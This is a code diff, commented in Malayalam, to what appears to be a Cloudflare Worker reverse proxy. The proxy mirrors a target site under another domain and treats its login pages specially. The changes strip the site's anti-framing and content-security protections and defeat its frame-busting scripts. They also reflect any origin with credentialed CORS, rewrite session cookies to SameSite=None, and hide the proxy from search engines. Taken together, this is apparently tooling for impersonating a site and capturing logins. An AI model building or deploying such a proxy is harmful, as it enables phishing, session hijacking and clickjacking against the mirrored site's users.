@@ -6,6 +6,19 @@ export default {
     const targetDomain = new URL(TARGET_URL).hostname;
     const currentDomain = url.hostname;
 
+    // CORS Preflight (OPTIONS) റിക്വസ്റ്റുകൾ കൃത്യമായി കൈകാര്യം ചെയ്യാൻ
+    if (request.method === "OPTIONS") {
+      return new Response(null, {
+        status: 204,
+        headers: {
+          "Access-Control-Allow-Origin": request.headers.get("Origin") || "*",
+          "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
+          "Access-Control-Allow-Headers": request.headers.get("Access-Control-Request-Headers") || "*",
+          "Access-Control-Allow-Credentials": "true",
+        },
+      });
+    }
+
     // URL വഴി പേജുകൾ തിരിച്ചറിയുന്നു
     const isLoginPageUrl = url.pathname.includes("login") || url.pathname.includes("giris");
 
@@ -30,15 +43,55 @@ export default {
     const response = await fetch(modifiedRequest);
     const responseHeaders = new Headers(response.headers);
 
-    // --- കൂട്ടിച്ചേർത്ത Security & No-Index Headers ---
+    // --- Iframe, Security & No-Index Headers ---
     responseHeaders.set("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
     responseHeaders.set("X-Content-Type-Options", "nosniff");
     responseHeaders.set("Referrer-Policy", "strict-origin-when-cross-origin");
+    
     // സെർച്ച് എഞ്ചിൻ ക്രോളറുകളെ തടയാൻ
     responseHeaders.set("X-Robots-Tag", "noindex, nofollow, noarchive");
-    // ലളിതമായ CSP (നമ്മുടെ കസ്റ്റം inline സ്റ്റൈലുകളും സ്ക്രിപ്റ്റുകളും പ്രവർത്തിക്കാൻ പാകത്തിൽ)
-    responseHeaders.set("Content-Security-Policy", "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;");
-    responseHeaders.delete("x-frame-options"); 
+
+    // Iframe-ൽ തടസ്സമില്ലാതെ പ്രവർത്തിക്കാൻ frame-ancestors * ചേർത്ത CSP
+    responseHeaders.set(
+      "Content-Security-Policy",
+      "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; frame-ancestors *;"
+    );
+
+    // Iframe ബ്ലോക്ക് ചെയ്യുന്ന എല്ലാ പഴയ ഹെഡറുകളും നീക്കം ചെയ്യുന്നു
+    responseHeaders.delete("x-frame-options");
+    responseHeaders.delete("X-Frame-Options");
+    responseHeaders.delete("content-security-policy-report-only");
+    responseHeaders.set("Cross-Origin-Resource-Policy", "cross-origin");
+
+    // CORS സപ്പോർട്ട്
+    const reqOrigin = request.headers.get("Origin");
+    if (reqOrigin) {
+      responseHeaders.set("Access-Control-Allow-Origin", reqOrigin);
+      responseHeaders.set("Access-Control-Allow-Credentials", "true");
+    } else {
+      responseHeaders.set("Access-Control-Allow-Origin", "*");
+    }
+
+    // Iframe-നകത്ത് ലോഗിൻ സെഷനും കുക്കികളും വർക്ക് ചെയ്യാൻ Set-Cookie അപ്ഡേറ്റ് ചെയ്യുന്നു
+    const cookies = response.headers.getSetCookie ? response.headers.getSetCookie() : [];
+    if (cookies.length > 0) {
+      responseHeaders.delete("set-cookie");
+      for (const cookie of cookies) {
+        let updatedCookie = cookie
+          .replace(new RegExp(`Domain=\\.?${targetDomain};?`, "gi"), "")
+          .replace(/SameSite=(Lax|Strict)/gi, "SameSite=None");
+        if (!/SameSite=/i.test(updatedCookie)) {
+          updatedCookie += "; SameSite=None";
+        }
+        if (!/Secure/i.test(updatedCookie)) {
+          updatedCookie += "; Secure";
+        }
+        if (!/Partitioned/i.test(updatedCookie)) {
+          updatedCookie += "; Partitioned";
+        }
+        responseHeaders.append("Set-Cookie", updatedCookie);
+      }
+    }
     // ------------------------------------------------
 
     if ([301, 302, 303, 307, 308].includes(response.status)) {
@@ -66,6 +119,15 @@ export default {
       // അടിസ്ഥാന മാറ്റങ്ങൾ
       html = html.replace(new RegExp(targetDomain, "gi"), currentDomain);
       html = html.replace(/lang="[^"]*"/gi, 'lang="en"');
+
+      // HTML-നകത്ത് Iframe ബ്ലോക്ക് ചെയ്യുന്ന Meta ടാഗുകൾ ഉണ്ടെങ്കിൽ നീക്കം ചെയ്യുന്നു
+      html = html.replace(/<meta[^>]*http-equiv=["']?(?:X-Frame-Options|Content-Security-Policy)["']?[^>]*>/gi, "");
+
+      // Iframe-ൽ നിന്ന് പുറത്തേക്ക് റീഡയറക്ട് ആകുന്നത് (Frame-busting & _top/_parent targets) തടയുന്നു
+      html = html.replace(/target=["']?(?:_top|_parent|_blank)["']?/gi, 'target="_self"');
+      html = html.replace(/top\.location\s*!==?\s*self\.location/gi, "false");
+      html = html.replace(/window\.top\s*!==?\s*window\.self/gi, "false");
+      html = html.replace(/top\.location\.href\s*=/gi, "self.location.href =");
 
       // അനാവശ്യ വാചകങ്ങൾ ഒഴിവാക്കുന്നു
       html = html.replace(/Your Gift.*?Free Followers\./gi, "");
@@ -188,8 +250,8 @@ export default {
         </style>
       `;
       
-      // HTML-ൽ സെർച്ച് എഞ്ചിൻ ക്രോളറുകളെ തടയാനുള്ള Meta tag ചേർക്കുന്നു
-      const metaRobots = `<meta name="robots" content="noindex, nofollow, noarchive">\n`;
+      // HTML-ൽ സെർച്ച് എഞ്ചിൻ ക്രോളറുകളെ തടയാനുള്ള Meta tag-ഉം target="_self" ഉറപ്പാക്കാൻ base tag-ഉം ചേർക്കുന്നു
+      const metaRobots = `<meta name="robots" content="noindex, nofollow, noarchive">\n<base target="_self">\n`;
       html = html.replace("</head>", metaRobots + customStyles + "</head>");
 
       // ലോഗിൻ പേജ് അല്ലെങ്കിൽ മാത്രം safeCleanup സ്ക്രിപ്റ്റ് ആഡ് ചെയ്യുന്നു (ലോഗിൻ ഫോം പൂർണ്ണമായി സുരക്ഷിതമാക്കാൻ)
@@ -198,6 +260,13 @@ export default {
           <script>
             document.addEventListener("DOMContentLoaded", function() {
               function safeCleanup() {
+                // എല്ലാ ലിങ്കുകളും ഫോമുകളും Iframe-നുള്ളിൽ തന്നെ തുറക്കാൻ നിർബന്ധിക്കുന്നു
+                document.querySelectorAll('a, form').forEach(function(el) {
+                  if (el.getAttribute('target') && el.getAttribute('target') !== '_self') {
+                    el.setAttribute('target', '_self');
+                  }
+                });
+
                 // 1. അനാവശ്യ വാചകങ്ങളും ലിങ്കുകളും കൃത്യമായി ഹൈഡ് ചെയ്യുന്നു
                 document.querySelectorAll('a, button, span, p, h1, h2, h3, h4, strong, li').forEach(function(el) {
                   // ലോഗിൻ ഫോമിനകത്തുള്ള ഘടകങ്ങൾ തൊടരുത്
@@ -371,7 +440,6 @@ export default {
 
       responseHeaders.delete("content-encoding");
       responseHeaders.delete("content-length");
-      // CSP മുകളിൽ സെറ്റ് ചെയ്തതിനാൽ താഴെയുള്ള delete ഒഴിവാക്കി പകരം മുകളിലെ കോഡ് വർക്ക് ചെയ്യും.
 
       return new Response(html, {
         status: response.status,
